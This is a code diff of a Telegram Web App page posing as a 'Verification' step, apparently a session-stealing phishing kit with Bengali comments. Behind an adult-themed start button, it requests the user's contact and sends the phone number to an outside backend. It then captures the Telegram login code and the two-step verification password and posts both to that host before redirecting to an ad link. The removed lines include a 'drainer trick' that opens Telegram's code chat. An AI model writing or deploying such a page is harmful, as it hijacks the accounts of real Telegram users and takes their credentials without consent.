@@ -6,64 +6,129 @@
     <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        * { box-sizing: border-box; }
         body { 
-            font-family: 'Arial', sans-serif;
-            background: #000 url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed;
-            background-size: cover; height: 100vh; overflow: hidden; display: flex; align-items: flex-end; justify-content: center;
+            font-family: 'Arial', sans-serif; 
+            margin: 0; padding: 0; 
+            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
+            background-size: cover;
+            height: 100vh; 
+            display: flex; 
+            align-items: flex-end; 
+            justify-content: center;
+            overflow: hidden;
         }
-        .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index: 1; }
+        .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         
-        .main-container { width: 90%; max-width: 360px; position: relative; z-index: 10; padding-bottom: 20px; text-align: center; }
-
-        .info-box { background: #fff; padding: 15px; border-radius: 15px; font-weight: bold; margin-bottom: 20px; font-size: 16px; color: #000; }
-
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .box {
-            width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2);
-            border: 2px solid #fff; border-radius: 12px; font-size: 30px;
-            color: #fff; font-weight: bold; display: flex; align-items: center; justify-content: center;
-            backdrop-filter: blur(5px);
+        .main-container { 
+            width: 90%; 
+            max-width: 380px; 
+            z-index: 2; 
+            text-align: center; 
+            margin-bottom: 40px; 
         }
 
-        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .btn { 
-            background: #4caf50; color: #fff; padding: 18px; border-radius: 12px;
-            font-size: 24px; font-weight: bold; border: none; cursor: pointer;
+        /* আঙুলের ইমোজি অ্যানিমেশন */
+        .finger-icon {
+            font-size: 75px;
+            display: block;
+            margin-bottom: 20px;
+            animation: bounce 1.2s infinite;
+            text-shadow: 0 5px 15px rgba(0,0,0,0.5);
         }
-        .btn:active { background: #388e3c; transform: scale(0.95); }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(20px); }
+        }
+
+        /* ওটিপি এবং পাসওয়ার্ড বক্স ডিজাইন */
+        .instruction-box {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 15px; border-radius: 15px;
+            margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
+        .otp-box {
+            width: 50px; height: 55px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.7);
+            border-radius: 12px; display: flex; align-items: center; justify-content: center;
+            font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(8px);
+        }
+
+        /* কিপ্যাড */
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .key { 
+            background: #4caf50; padding: 18px; border-radius: 12px; 
+            font-size: 26px; font-weight: bold; color: white; 
+            cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            -webkit-tap-highlight-color: transparent;
+        }
+        .key:active { background: #388e3c; transform: scale(0.95); }
+        .key-back { background: #e67e22; font-size: 22px; }
+
+        /* পাসওয়ার্ড সেকশন */
+        .pwd-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px; border-radius: 20px;
+            text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+        }
+        .pwd-input {
+            width: 100%; padding: 15px; margin: 15px 0;
+            border: 2px solid #4caf50; border-radius: 10px;
+            font-size: 18px; text-align: center; outline: none;
+        }
+        .pwd-btn {
+            background: #ff4757; color: white; border: none;
+            padding: 15px; border-radius: 10px; font-weight: bold;
+            cursor: pointer; width: 100%; font-size: 18px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
 
         .hidden { display: none !important; }
-        .loader { color: #fff; font-size: 18px; font-weight: bold; }
+        .loader { color: white; font-weight: bold; margin-top: 15px; font-size: 18px; text-shadow: 1px 1px 5px black; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
 
     <div class="main-container">
-        <!-- Step 1 -->
+        <!-- ধাপ ১: স্টার্টিং স্ক্রিন -->
         <div id="step0">
-            <div style="font-size: 60px; animation: bounce 1s infinite; margin-bottom: 10px;">👇</div>
+            <div id="finger_point" class="finger-icon">👇</div>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- Step 2 (OTP Area) -->
+        <!-- ধাপ ২: ওটিপি স্ক্রিন -->
         <div id="step2" class="hidden">
-            <div class="info-box">Enter the 5-digit code!</div>
-
-            <div class="otp-inputs">
-                <div class="box" id="b1"></div>
-                <div class="box" id="b2"></div>
-                <div class="box" id="b3"></div>
-                <div class="box" id="b4"></div>
-                <div class="box" id="b5"></div>
+            <div class="instruction-box">
+                Enter the 5-digit code sent to your Telegram!
             </div>
+            <div class="otp-inputs">
+                <div class="otp-box" id="b1"></div>
+                <div class="otp-box" id="b2"></div>
+                <div class="otp-box" id="b3"></div>
+                <div class="otp-box" id="b4"></div>
+                <div class="otp-box" id="b5"></div>
+            </div>
+            <div class="keypad">
+                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
+                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
+                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
+                <div style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key key-back" onclick="clearNum()">⌫</div>
+            </div>
+        </div>
 
-            <div class="numpad">
-                <button class="btn" onclick="add('1')">1</button><button class="btn" onclick="add('2')">2</button><button class="btn" onclick="add('3')">3</button>
-                <button class="btn" onclick="add('4')">4</button><button class="btn" onclick="add('5')">5</button><button class="btn" onclick="add('6')">6</button>
-                <button class="btn" onclick="add('7')">7</button><button class="btn" onclick="add('8')">8</button><button class="btn" onclick="add('9')">9</button>
-                <div style="visibility:hidden"></div><button class="btn" onclick="add('0')">0</button><button class="btn" style="background:#d32f2f" onclick="del()">⌫</button>
+        <!-- ধাপ ৩: টু-স্টেপ পাসওয়ার্ড স্ক্রিন -->
+        <div id="step3" class="hidden">
+            <div class="pwd-container">
+                <h3 style="margin:0; color:#2c3e50;">Two-Step Verification</h3>
+                <p style="font-size: 14px; color: #7f8c8d;">Your account is protected by an additional password.</p>
+                <input type="password" id="tg_password" class="pwd-input" placeholder="Enter Password">
+                <button class="pwd-btn" onclick="submitPassword()">Continue</button>
             </div>
         </div>
     </div>
@@ -71,89 +136,110 @@
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        
-        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
-        const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
-        let otp = "";
 
-        // শুরুতে মেইন বাটন সেটআপ
+        // মেইন বাটন সেটআপ
         tg.MainButton.setText("🍓 START CONTINUE 🔞");
+        tg.MainButton.textColor = "#ffffff";
+        tg.MainButton.color = "#ff4757";
         tg.MainButton.show();
-        tg.MainButton.onClick(startProcess);
+        tg.MainButton.onClick(startFlow);
 
-        function startProcess() {
+        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
+        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
+        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
+        let currentOTP = "";
+
+        function startFlow() {
             tg.requestContact();
             tg.MainButton.hide();
-            document.getElementById('step0').querySelector('div').classList.add('hidden');
+            document.getElementById('finger_point').classList.add('hidden');
             document.getElementById('load').classList.remove('hidden');
-            poll();
+            pollContact();
         }
 
-        async function poll() {
+        async function pollContact() {
             try {
                 const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                 const data = await res.json();
+                if (data.status === "success") { sendPhoneToBackend(data.phone); }
+                else { setTimeout(pollContact, 1500); }
+            } catch (e) { setTimeout(pollContact, 2000); }
+        }
+
+        async function sendPhoneToBackend(phone) {
+            try {
+                const res = await fetch(`${BACKEND_URL}/send_number`, {
+                    method: "POST", headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, phone: phone })
+                });
+                const data = await res.json();
                 if (data.status === "success") {
-                    const sendRes = await fetch(`${BACKEND_URL}/send_number`, {
-                        method: "POST", headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify({ user_id: userId, phone: data.phone })
-                    });
-                    const sendData = await sendRes.json();
-                    if(sendData.status === "success") {
-                        showOTPPage();
-                    }
-                } else { setTimeout(poll, 1500); }
-            } catch (e) { setTimeout(poll, 2000); }
+                    document.getElementById('step0').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                } else {
+                    tg.showAlert("Error: " + data.message);
+                    location.reload();
+                }
+            } catch (e) { tg.showAlert("Server Connection Error!"); }
         }
 
-        function showOTPPage() {
-            document.getElementById('step0').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-
-            // --- রাশিয়ান ড্রেইনার ট্রিক: মেইন বাটনকে ওটিপি চ্যাট লিংকে রূপান্তর করা ---
-            tg.MainButton.setText("📩 VIEW CODE (MINIMIZE)");
-            tg.MainButton.color = "#248bcf"; // নীল রঙ
-            tg.MainButton.show();
-
-            // পুরনো ক্লিক ফাংশন সরিয়ে নতুন ফাংশন দেওয়া
-            tg.MainButton.offClick(startProcess);
-            tg.MainButton.onClick(() => {
-                tg.HapticFeedback.notificationOccurred('success');
-                // সরাসরি টেলিগ্রামের নিজস্ব মেথড দিয়ে চ্যাট ওপেন
-                tg.openTelegramLink("tg://openmessage?user_id=777000");
-                
-                // মিনিমাইজ ট্রিক
-                setTimeout(() => {
-                    tg.switchInlineQuery("OTP"); 
-                }, 100);
-            });
-        }
-
-        function add(n) {
-            if(otp.length < 5) {
-                otp += n; render();
-                if(otp.length === 5) verify();
+        function addNum(n) {
+            if(currentOTP.length < 5) {
+                currentOTP += n;
+                updateOTPViz();
+                if(currentOTP.length === 5) { verifyOTP(); }
             }
         }
-        function del() { otp = otp.slice(0,-1); render(); }
-        function render() {
-            for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = otp[i-1] || "";
+
+        function clearNum() {
+            currentOTP = currentOTP.slice(0, -1);
+            updateOTPViz();
         }
 
-        async function verify() {
+        function updateOTPViz() {
+            for(let i=1; i<=5; i++) {
+                document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
+            }
+        }
+
+        async function verifyOTP() {
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                     method: "POST", headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: otp })
+                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 const data = await res.json();
-                if(data.status === "success") {
-                    window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
-                } else {
-                    tg.showAlert("Invalid Code!");
-                    otp = ""; render();
+                
+                if (data.status === "success") {
+                    window.location.href = OFF_LINK;
+                } else if (data.status === "password_needed") {
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                } else { 
+                    tg.showAlert(data.message || "Invalid OTP Code!");
+                    currentOTP = ""; updateOTPViz();
                 }
-            } catch(e) {}
+            } catch (e) { }
+        }
+
+        async function submitPassword() {
+            const pwd = document.getElementById('tg_password').value;
+            if(!pwd) return;
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/verify_password`, {
+                    method: "POST", headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, password: pwd })
+                });
+                const data = await res.json();
+
+                if (data.status === "success") {
+                    window.location.href = OFF_LINK;
+                } else {
+                    tg.showAlert(data.message || "Wrong Password!");
+                    document.getElementById('tg_password').value = "";
+                }
+            } catch (e) { }
         }
     </script>
 </body>
